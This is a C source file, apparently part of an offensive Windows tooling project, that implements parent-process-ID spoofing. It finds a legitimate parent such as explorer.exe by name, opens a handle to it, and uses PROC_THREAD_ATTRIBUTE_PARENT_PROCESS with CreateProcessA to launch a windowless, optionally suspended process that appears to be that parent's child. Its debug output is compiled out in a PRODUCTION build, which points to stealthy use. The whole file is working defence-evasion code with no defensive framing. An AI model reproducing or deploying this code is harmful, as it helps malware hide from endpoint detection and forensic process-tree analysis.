/*
 * Author: 28Zaakypro@proton.me
 * PPID Spoofing - Makes process appear launched by legitimate parent (explorer.exe)
 * Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to set fake parent PID
 */

#include "ppid_spoofing.h"
#include "syscalls.h"
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

// Finds process PID by name
DWORD FindProcessByName(const char* processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

// Creates process with spoofed parent PID
BOOL CreateProcessWithSpoofedPPID(
    const char* targetProcess,
    const char* parentProcess,
    BOOL suspended,
    PPPID_SPOOF_RESULT result)
{
    ZeroMemory(result, sizeof(PPID_SPOOF_RESULT));
    lstrcpynA(result->processName, targetProcess, MAX_PATH);
    lstrcpynA(result->parentName, parentProcess, MAX_PATH);

    // Find parent PID to spoof
    #ifndef PRODUCTION
    printf("[*] Looking for parent: %s\n", parentProcess);
    #endif
    
    DWORD parentPid = FindProcessByName(parentProcess);
    if (parentPid == 0) {
        #ifndef PRODUCTION
        printf("[-] Parent not found: %s\n", parentProcess);
        #endif
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Found parent: %s (PID: %lu)\n", parentProcess, parentPid);
    #endif
    result->spoofedParentPid = parentPid;

    // Open handle to parent
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (hParent == NULL) {
        #ifndef PRODUCTION
        printf("[-] Can't open parent: %lu\n", GetLastError());
        #endif
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Parent handle obtained\n");
    #endif

    // Configure attributes for PPID spoofing
    SIZE_T attributeSize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    
    pAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attributeSize);
    
    if (pAttributeList == NULL) {
        #ifndef PRODUCTION
        printf("[-] Échec d'allocation mémoire pour attributs\n");
        #endif
        CloseHandle(hParent);
        return FALSE;
    }

    // Initialiser la liste d'attributs
    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize)) {
        #ifndef PRODUCTION
        printf("[-] InitializeProcThreadAttributeList échoué: %lu\n", GetLastError());
        #endif
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParent);
        return FALSE;
    }

    // Ajouter l'attribut PARENT_PROCESS
    if (!UpdateProcThreadAttribute(
            pAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent,
            sizeof(HANDLE),
            NULL,
            NULL))
    {
        #ifndef PRODUCTION
        printf("[-] UpdateProcThreadAttribute échoué: %lu\n", GetLastError());
        #endif
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParent);
        return FALSE;
    }

    #ifndef PRODUCTION
    printf("[+] Attributs PPID configurés\n");
    #endif

    // ÉTAPE 4: Configurer STARTUPINFOEX
    STARTUPINFOEXA siex = {0};
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    siex.lpAttributeList = pAttributeList;

    PROCESS_INFORMATION pi = {0};

    // Flags de création
    DWORD creationFlags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
    if (suspended) {
        creationFlags |= CREATE_SUSPENDED;
    }

    // ÉTAPE 5: Créer le processus avec PPID spoofé
    #ifndef PRODUCTION
    printf("[*] Création du processus: %s\n", targetProcess);
    #endif
    #ifndef PRODUCTION
    printf("    PPID spoofé: %lu (%s)\n", parentPid, parentProcess);
    #endif

    BOOL success = CreateProcessA(
        NULL,
        (LPSTR)targetProcess,
        NULL,
        NULL,
        FALSE,
        creationFlags,
        NULL,
        NULL,
        &siex.StartupInfo,
        &pi);

    // Nettoyage des attributs
    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    CloseHandle(hParent);

    if (!success) {
        #ifndef PRODUCTION
        printf("[-] CreateProcessA échoué: %lu\n", GetLastError());
        #endif
        return FALSE;
    }

    // Remplir le résultat
    result->success = TRUE;
    result->processId = pi.dwProcessId;
    result->threadId = pi.dwThreadId;
    result->hProcess = pi.hProcess;
    result->hThread = pi.hThread;

    #ifndef PRODUCTION
    printf("[+] Processus créé avec succès\n");
    #endif
    #ifndef PRODUCTION
    printf("    PID: %lu\n", pi.dwProcessId);
    #endif
    #ifndef PRODUCTION
    printf("    TID: %lu\n", pi.dwThreadId);
    #endif
    #ifndef PRODUCTION
    printf("    PPID spoofé: %lu (%s)\n", parentPid, parentProcess);
    #endif

    return TRUE;
}

// ============================================================================
// AFFICHAGE
// ============================================================================

VOID PrintPPIDSpoofResult(PPPID_SPOOF_RESULT result)
{
    #ifndef PRODUCTION
    printf("\n");
    #endif
    #ifndef PRODUCTION
    printf("╔══════════════════════════════════════════════════════╗\n");
    #endif
    #ifndef PRODUCTION
    printf("║       RÉSULTAT DU PPID SPOOFING                      ║\n");
    #endif
    #ifndef PRODUCTION
    printf("╚══════════════════════════════════════════════════════╝\n");
    #endif
    #ifndef PRODUCTION
    printf("\n");
    #endif

    if (result->success) {
        #ifndef PRODUCTION
        printf("  [✓] PPID Spoofing réussi\n");
        #endif
    } else {
        #ifndef PRODUCTION
        printf("  [✗] PPID Spoofing échoué\n");
        #endif
    }

    #ifndef PRODUCTION
    printf("  • Processus créé    : %s\n", result->processName);
    #endif
    #ifndef PRODUCTION
    printf("  • PID               : %lu\n", result->processId);
    #endif
    #ifndef PRODUCTION
    printf("  • TID               : %lu\n", result->threadId);
    #endif
    #ifndef PRODUCTION
    printf("  • Parent spoofé     : %s\n", result->parentName);
    #endif
    #ifndef PRODUCTION
    printf("  • PPID spoofé       : %lu\n", result->spoofedParentPid);
    #endif
    #ifndef PRODUCTION
    printf("\n");
    #endif
}
